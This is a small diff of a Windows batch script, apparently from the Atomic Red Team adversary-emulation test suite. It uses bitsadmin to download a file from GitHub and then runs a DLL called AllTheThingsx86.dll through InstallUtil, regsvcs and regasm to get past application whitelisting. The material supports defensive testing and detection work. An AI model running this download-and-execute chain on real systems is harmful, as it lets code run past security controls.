@@ -7,7 +7,6 @@ bitsadmin.exe /transfer "ATT" https://github.com/redcanaryco/atomic-red-team/raw
 timeout /t 1 /nobreak > NUL
 
 REM X86
-Executing X86 AllTheThings Test
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx86.dll
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThingsx86.dll
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThingsx86.dll
